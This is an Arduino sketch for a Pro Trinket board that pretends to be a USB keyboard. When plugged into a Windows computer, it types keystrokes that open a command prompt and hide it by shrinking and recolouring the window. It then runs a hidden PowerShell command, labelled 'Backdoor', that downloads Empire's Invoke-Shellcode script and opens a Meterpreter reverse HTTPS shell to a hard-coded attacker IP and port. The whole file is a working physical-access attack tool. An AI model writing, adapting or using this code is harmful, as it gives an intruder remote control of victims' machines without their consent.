#include <ProTrinketKeyboard.h>

#define ATTACKER_IP "192.168.10.1"
#define ATTACKER_PORT "8443"

void pollingDelay(unsigned long);

void setup()
{
  // start USB stuff
  TrinketKeyboard.begin();
}

void loop()
{
  // Wait a few seconds for the keyboard to get picked up by the OS
  pollingDelay(2000L);

  // Bring up run
  TrinketKeyboard.pressKey(KEYCODE_MOD_LEFT_GUI, KEYCODE_R);
  TrinketKeyboard.pressKey(0, 0);

  // Slight delay to allow for run prompt to display
  pollingDelay(500L);

  // Enter cmd in run prompt (println acts as enter pressed)
  TrinketKeyboard.println("cmd");

  // Give a bit of time for the command prompt to display and capture focus for keyboard entry
  pollingDelay(1000L);

  // Set command prompt window size
  TrinketKeyboard.println("mode con: cols=20 lines=1");

  // Set command prompt colors
  TrinketKeyboard.println("COLOR FE");

  // Backdoor
  TrinketKeyboard.print("powershell -nop -windowstyle hidden -NonInteractive -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/Empire/master/data/module_source/code_execution/Invoke-Shellcode.ps1');invoke-shellcode -Payload windows/meterpreter/reverse_https -f -Lhost ");
  TrinketKeyboard.print(ATTACKER_IP);
  TrinketKeyboard.print(" -Lport ");
  TrinketKeyboard.println(ATTACKER_PORT);

  exit(0);
}

void pollingDelay(unsigned long delayMillis)
{
  unsigned long time_stamp = millis();
  while (millis() < (time_stamp + delayMillis)) {
    TrinketKeyboard.poll();
  }
}
